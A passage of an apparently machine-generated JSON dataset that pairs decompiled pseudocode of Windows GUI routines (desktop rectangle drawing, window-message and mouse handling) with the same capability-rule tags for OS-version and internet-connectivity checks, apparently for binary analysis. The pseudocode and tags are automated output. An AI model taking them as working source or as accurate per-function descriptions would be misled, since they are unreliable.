        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045fb08(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uStack52 = 0x45fb1d;\n    iVar1 = (**(*param_2 + 0x38))();\n    if (var_1h == '\\0') {\n        var_20h = param_2[0x13];\n        var_1ch = param_2[0x14];\n        var_18h = param_2[0x15];\n        var_14h = param_2[0x16];\n    }\n    else {\n        var_20h = param_2[0x19];\n        var_1ch = param_2[0x1a];\n        var_18h = param_2[0x1b];\n        var_14h = param_2[0x1c];\n    }\n    uStack52 = 0x45fb44;\n    uVar2 = sub.user32.dll_GetDesktopWindow();\n    uStack52 = 0x402;\n    uStack56 = 0;\n    puStack64 = 0x45fb57;\n    uStack60 = uVar2;\n    uVar3 = sub.user32.dll_GetDCEx();\n    uStack68 = 0x45fc23;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.0045fb08::var_1h + 1;\n    uVar4 = fcn.00428438();\n    uVar5 = sub.gdi32.dll_SelectObject(uVar3, uVar4);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h + iVar1, var_1ch, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_18h - iVar1, var_1ch + iVar1, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_14h - iVar1, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_1ch, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    uVar4 = uVar3;\n    sub.gdi32.dll_SelectObject(uVar3, uVar5);\n    *in_FS_OFFSET = uVar4;\n    sub.user32.dll_ReleaseDC(uVar2, uVar3, 0x45fc2a);\n    return;\n}\n",
        "token_count": 791
    },
    "0045fc54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fc54(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uchar auStack28 [5];\n    uint uStack23;\n    \n    cVar1 = fcn.004047cc();\n    if ((*0x4ab010 != '\\0') && (cVar1 == '\\0')) {\n        fcn.004047f0();\n    }\n    fcn.0045ea84();\n    if (*(param_2 + 4) < 3) {\n        auStack28[0] = 1;\n        if (cVar1 == '\\0') {\n            uVar2 = *(param_2 + 4);\n            fcn.0040483c(auStack28, uVar2, uStack23);\n        }\n        else {\n            uVar2 = *(param_2 + 4);\n            fcn.0040483c(auStack28, uVar2, uStack23);\n        }\n        *(param_2 + 0xc) = uVar2 & 0xff;\n    }\n    else if (*(param_2 + 4) == 3) {\n        if (cVar1 == '\\0') {\n            fcn.0040483c(uStack23);\n        }\n        else {\n            fcn.0040483c(uStack23);\n        }\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "0045fd44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045fd44(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint *arg_8h_00;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if ((in_EDX == 0) || (in_EDX == -1)) {\n        iVar3 = *(in_EAX + 0x94);\n        if (((iVar3 == 0) || (*(iVar3 + 0x1db) == '\\0')) || (*(iVar3 + 0x1b0) == 0)) {\n            fcn.00418198();\n            var_1ch = var_24h;\n            var_18h = var_20h;\n            if (*(in_EAX + 0x30) != 0) {\n                fcn.0045e9d4();\n                var_1ch = var_24h;\n                var_18h = var_20h;\n            }\n        }\n        else {\n            (**(**(iVar3 + 0x1b0) + 0x14))();\n            var_34h = 2;\n            fcn.00466ca8();\n            sub.user32.dll_MapWindowPoints();\n        }\n        uVar2 = fcn.0045eed0();\n        arg_8h_00 = &fcn.0045fd44::var_34h;\n        uStack80 = 0x45fdf5;\n        fcn.0045eee4();\n        uStack80 = 0x45fe02;\n        fcn.004181e8(arg_8h_00, uVar2);\n        var_1ch = var_34h;\n        var_18h = uStack52;\n        uStack24 = uStack48;\n        uStack20 = uStack44;\n        uStack80 = 0x45fe16;\n        var_5h = fcn.0045ff24();\n        goto code_r0x0045ff17;\n    }\n    fcn.00460230();\n    if (*(in_EAX + 0x94) == 0) {\ncode_r0x0045fe49:\n        var_5h = 1;\n    }\n    else {\n        cVar1 = fcn.0040483c();\n        if (cVar1 != '\\0') goto code_r0x0045fe49;\n        var_5h = 0;\n    }\n    if (var_5h != 0) {\n        var_ch = fcn.0045c2b8();\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        if (*(in_EAX + 0x94) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.00466ca8();\n        }\n        fcn.0045e864();\n        if (iVar3 != 0) {\n            sub.user32.dll_MapWindowPoints(iVar3, 0, &fcn.0045fd44::var_1ch, 2);\n        }\n        *(var_ch + 8) = in_EDX;\n        *(var_ch + 0x5c) = arg_8h;\n        *(var_ch + 0x60) = var_4h;\n        *(var_ch + 0x4c) = var_1ch;\n        *(var_ch + 0x50) = var_18h;\n        *(var_ch + 0x54) = uStack24;\n        *(var_ch + 0x58) = uStack20;\n        uVar2 = fcn.00466ca8(&fcn.0045fd44::var_1ch, 1);\n        sub.user32.dll_MapWindowPoints(0, uVar2);\n        fcn.0040483c();\n        *in_FS_OFFSET = var_18h;\n        uVar4 = fcn.00404640(0x45ff17);\n        return uVar4;\n    }\ncode_r0x0045ff17:\n    return var_5h;\n}\n",
        "token_count": 1002
    },
    "0045ffcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0045ffcc(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = CONCAT31(param_1 >> 8, 1);\n    if (*(in_EAX + 0xb2) != 0) {\n        (**(in_EAX + 0xb0))(&uStack8, param_1);\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 112
    },
    "00460098": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460098(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xba) != 0) {\n        (**(in_EAX + 0xb8))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00460128": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00460128(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piStack28;\n    int32_t *piStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    piStack28 = *(in_EAX[0x1d] + 0x14);\n    if (piStack28 == NULL) {\n        piStack28 = NULL;\n    }\n    piStack24 = *(in_EAX[0x1d] + 0x10);\n    if (piStack24 == NULL) {\n        piStack24 = NULL;\n    }\n    iStack20 = *(in_EAX[0x1d] + 0xc);\n    if (iStack20 == 0) {\n        iStack20 = 0;\n    }\n    iStack16 = *(in_EAX[0x1d] + 8);\n    if (iStack16 == 0) {\n        iStack16 = 0;\n    }\n    (**(*in_EAX + 0x38))();\n    if ((piStack28 < 1) || (*param_2 <= piStack28)) {\n        if ((0 < &iStack16) && (*param_2 < &iStack16)) {\n            *param_2 = &iStack16;\n        }\n    }\n    else {\n        *param_2 = piStack28;\n    }\n    if ((piStack24 < 1) || (*param_1 <= piStack24)) {\n        if ((0 < &iStack20) && (*param_1 < &iStack20)) {\n            *param_1 = &iStack20;\n        }\n    }\n    else {\n        *param_1 = piStack24;\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "00460230": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00460230(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = (**(*in_EAX + 0x54))();\n    if (uVar1 != '\\0') {\n        in_EAX[0x28] = in_EAX[0x13];\n        in_EAX[0x27] = in_EAX[0x12];\n        return in_EAX[0x12];\n    }\n    if (in_EAX[0x25] != 0) {\n        if ((*(in_EAX + 0x24) == '\\x02') || (*(in_EAX[0x25] + 0x5b) - 1U < 2)) {\n            uVar1 = in_EAX[0x13];\n            in_EAX[0x2a] = uVar1;\n        }\n        else if ((*(in_EAX + 0x24) == '\\x01') || (uVar1 = *(in_EAX[0x25] + 0x5b) - 5,  *(in_EAX[0x25] + 0x5b) - 3U < 2))\n        {\n            uVar1 = in_EAX[0x12];\n            in_EAX[0x29] = uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 307
    },
    "004602d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004602d8(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint lpKeyState;\n    int32_t *var_15h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    if (((((*(in_EAX + 7) & 0x10) == 0) || (*NULL = fcn.00471968(),  *NULL == NULL)) || ((*NULL)[0xa6] == 0)) ||\n       (cVar3 = (**(*(*NULL)[0xa6] + 0x24))(),  cVar3 == '\\0')) {\n        if ((*param_2 < 0x100) || (0x109 < *param_2)) {\n            uVar1 = *param_2;\n            if ((uVar1 < 0x200) || (0x20a < uVar1)) {\n                if (uVar1 == 0xb00b) {\n                    fcn.0045eae0(param_2[2]);\n                }\n            }\n            else {\n                if (((*(in_EAX + 0x14) & 0x80) == 0) && (((uVar1 == 0x203 || (uVar1 == 0x206)) || (uVar1 == 0x209)))) {\n                    *param_2 = *param_2 - 2;\n                }\n    // switch table (8 cases) at 0x4603b1\n                switch(*param_2) {\n                case 0x200:\n                    func_0x0047ceb0();\n                    break;\n                case 0x201:\n                case 0x203:\n                    if (*(in_EAX + 0x5d) == '\\x01') {\n                        fcn.0040483c();\n                        return;\n                    }\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 1;\n                    break;\n                case 0x202:\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfffe;\n                    break;\n                default:\n                    if (((*(*0x4aafe4 + 0x20) != '\\0') && (*(*0x4aafe4 + 0x1c) != 0)) &&\n                       (*param_2 == *(*0x4aafe4 + 0x1c))) {\n                        sub.user32.dll_GetKeyboardState(&lpKeyState);\n                        var_10h = *param_2;\n                        var_ch._0_1_ = fcn.00471868();\n                        var_ch._2_2_ = *(param_2 + 1);\n                        var_8h = param_2[2];\n                        fcn.0040483c();\n                        return;\n                    }\n                    break;\n                case 0x207:\n                    if ((((*(in_EAX + 0x52) & 8) != 0) && (*0x4605a4 == (*0x4605a0 & *(in_EAX + 0x15)))) &&\n                       (cVar3 = fcn.0046bc48(),  cVar3 == '\\0')) {\n                        fcn.0046bbd4();\n                        var_15h._0_1_ = '\\0';\n                        piVar2 = *(*0x4aafe4 + 0x28);\n                        if (piVar2 != NULL) {\n                            cVar3 = fcn.004047cc();\n                            if (cVar3 == '\\0') {\n                                if (in_EAX[0xc] == 0) {\n                                    *NULL = fcn.00471968();\n                                    if (*NULL != NULL) {\n                                        fcn.00466ca8();\n                                        var_15h._0_1_ = (**(**(*0x4aafe4 + 0x28) + 0xe0))();\n                                    }\n                                }\n                                else {\n                                    fcn.00466ca8();\n                                    var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                                }\n                            }\n                            else {\n                                fcn.00466ca8();\n                                var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                            }\n                        }\n                        if (var_15h == '\\0') {\n                            if (*(*0x4aafe4 + 0x28) != 0) {\n                                fcn.0046bd14();\n                            }\n                        }\n                        else {\n                            param_2[3] = 1;\n                            fcn.0047d008();\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            *NULL = fcn.00471968();\n            if ((*NULL != NULL) && (cVar3 = (**(**NULL + 0x100))(),  cVar3 != '\\0')) {\n                return;\n            }\n        }\n        (**(*in_EAX + -0x14))();\n    }\n    return;\n}\n",
        "token_count": 1130
    },
    "00460684": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00460684(int32_t arg_8h)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    \n    if (in_AL == '\\0') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x180))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x460894 == (*(*(arg_8h + -8) + 0x61) & *0x460890))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x40))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x01') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x184))) ||\n           (((*(*(arg_8h + -4) + 0x20) == 0 &&\n             ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x460894 == (*(*(arg_8h + -8) + 0x61) & *0x460898))))) &&\n            (iVar1 = *(*(arg_8h + -8) + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x44))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x02') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x188))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x46089c == (*(*(arg_8h + -8) + 0x61) & *0x46089c))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x48))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if ((in_AL == '\\x03') &&\n            (((iVar1 = *(*(arg_8h + -4) + 0x20),  iVar1 != 0 &&\n              (iVar1 = *(iVar1 + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x18c))) ||\n             (((*(*(arg_8h + -4) + 0x20) == 0 &&\n               ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x4608a0 == (*(*(arg_8h + -8) + 0x61) & *0x4608a0))))) &&\n              (iVar1 = *(*(arg_8h + -8) + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x4c))))))) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 893
    },
    "00460ac0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00460ac0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xc2) != 0) {\n        (**(in_EAX + 0xc0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00460c40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00460c40(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    char cVar4;\n    \n    cVar4 = '\\0';\n    uVar1 = *param_2;\n    uVar2 = *param_1;\n    cVar3 = fcn.00460068();\n    if (cVar3 != '\\0') {\n        if (((*(in_EAX + 0x5c) == '\\0') || (cVar3 = fcn.0045fffc(),  cVar3 != '\\0')) ||\n           (cVar3 = fcn.00460068(),  cVar3 != '\\0')) {\n            cVar4 = '\\x01';\n        }\n        else {\n            cVar4 = '\\0';\n        }\n        if (cVar4 != '\\0') {\n            *param_2 = uVar1;\n            *param_1 = uVar2;\n        }\n    }\n    return cVar4;\n}\n",
        "token_count": 237
    },
    "00460d8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00460d8c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        (**(in_EAX + 200))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00460e38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00460e38(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xd2) != 0) {\n        (**(in_EAX + 0xd0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00461144": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461144(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x5a) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            fcn.0046110c(&stack0xfffffffc);\n        }\n        else {\n            fcn.0046110c(&stack0xfffffffc);\n        }\n        *(in_EAX + 0x5a) = 1;\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "00461214": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461214(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*(*0x4a5178 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004612a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004612a0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x56) != '\\0') {\n        fcn.0045f038();\n        *(in_EAX + 0x56) = 1;\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0046145c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046145c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = (**(*in_EAX + 0x54))();\n    if ((cVar1 == '\\0') || (in_EAX[0xc] == 0)) {\n        iVar2 = fcn.0046134c();\n        if (iVar2 != 0) {\n            *(*(param_2 + 8) + 8) = iVar2;\n            uVar3 = fcn.00466ca8();\n            *(*(param_2 + 8) + 0xc) = uVar3;\n        }\n    }\n    else {\n        fcn.004613d0(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "004614bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00461503)\n\nvoid __fastcall fcn.004614bc(char param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4615ac;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        if (param_1 != '\\0') {\n            fcn.0045ef44();\n        }\n        fcn.0045ef74();\n        if ((param_1 == '\\0') || (cVar1 = (**(*in_EAX + 0x50))(),  cVar1 == '\\x01')) {\n            (**(*in_EAX + 0x68))();\n        }\n        if ((param_1 == '\\0') || (in_EAX[0x21] == 0)) {\n            fcn.004054c0();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x57) == '\\x01')) {\n            fcn.0045ee64();\n        }\n        if ((param_1 == '\\0') || (*(in_EAX + 0x112) == 0)) {\n            in_EAX[0x44] = *(param_2 + 0x40);\n            in_EAX[0x45] = *(param_2 + 0x44);\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4615b3;\n    uStack32 = 0x4615ab;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 437
    },
    "004618e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004618e8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uStack64;\n    uint uStack60;\n    int16_t iStack55;\n    int16_t iStack53;\n    uchar auStack28 [12];\n    \n    if (*(param_2 + 0xc) == 0) {\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            iStack55 = *(param_2 + 8);\n            iStack53 = *(param_2 + 8) >> 0x10;\n            cVar1 = fcn.00418210(iStack55, iStack53);\n            if (cVar1 == '\\0') {\n                fcn.0045ea84();\n                (**(*in_EAX + 0x44))(uStack64, uStack60);\n                iVar2 = sub.user32.dll_PtInRect(auStack28);\n                if (iVar2 == 0) {\n                    (**(*in_EAX + -0x10))();\n                    return;\n                }\n            }\n            fcn.0040483c();\n            *(param_2 + 0xc) = 0;\n            piVar3 = fcn.0040483c();\n            if ((piVar3 != NULL) && (*(piVar3 + 0x61) != '\\0')) {\n                fcn.0045eab0();\n                piVar3[0x19] = in_EAX;\n                cVar1 = fcn.00418210();\n                if (cVar1 != '\\0') {\n                    fcn.00418198();\n                    fcn.0045e9d4();\n                }\n                (**(*piVar3 + 0x40))();\n                *(param_2 + 0xc) = 1;\n            }\n            if (*(param_2 + 0xc) == 0) {\n                (**(*in_EAX + -0x10))();\n            }\n        }\n        else {\n            (**(*in_EAX + -0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "00461d28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00461d28(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char extraout_DL;\n    \n    piVar1 = fcn.00404a0c();\n    fcn.0041f924();\n    if (*(piVar1 + 0x77) != '\\0') {\n        *(piVar1 + 0x77) = 0;\n        fcn.0045c850();\n    }\n    fcn.00406f3c();\n    fcn.00404640();\n    if (piVar1[0xc] != 0) {\n        fcn.00462b14();\n    }\n    if (piVar1[0x6d] != 0) {\n        (**(*piVar1 + 0xb4))();\n    }\n    iVar2 = fcn.00462d98();\n    while (iVar2 != 0) {\n        piVar3 = fcn.00462d5c();\n        fcn.00462b80();\n        (**(*piVar3 + -4))();\n        iVar2 = fcn.00462d98();\n    }\n    fcn.00404640();\n    if (piVar1[0x70] != 0) {\n        fcn.004207c8();\n    }\n    fcn.00404640();\n    fcn.0045dea4();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 334
    },
    "00461e08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00461e08(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x1d0) == 0) {\n        return;\n    }\n    puStack28 = 0x461e2f;\n    fcn.00404610();\n    uStack32 = 0x461ecc;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar3 = *(*(in_EAX + 0x1d0) + 8);\n    puStack28 = &stack0xfffffffc;\n    fcn.004197b0();\n    iVar2 = iVar3;\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar1 = fcn.00419610();\n            if ((-1 < *(iVar1 + 0x1d4)) && (*(iVar1 + 0x1d4) < iVar3)) {\n                fcn.00419704();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar2 = fcn.00419610();\n            if (iVar2 != 0) {\n                fcn.00466ee8();\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n 